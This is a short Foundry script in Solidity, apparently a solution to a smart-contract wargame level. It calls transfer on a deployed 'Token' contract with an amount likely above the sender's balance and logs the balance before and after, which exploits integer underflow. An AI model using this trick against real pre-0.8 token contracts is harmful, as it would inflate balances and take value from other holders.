// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "forge-std/Script.sol";
import "../src/token.sol";

contract tokenHackScript is Script {
    Token public contractInstance;

    function setUp() public {
        contractInstance = Token(0x00Ea5B6a793c09826F54f0ac4a73248A2901E574);
    }

    function run() public {
        vm.startBroadcast();
        console2.log(
            "Current balance is :",
            contractInstance.balanceOf(msg.sender)
        );
        contractInstance.transfer(
            0x55C76828DF0ef0EB13DEA4503C8FAad51Abd00Ad,
            21
        );
        console2.log(
            "New balance is :",
            contractInstance.balanceOf(msg.sender)
        );
        vm.stopBroadcast();
    }
}
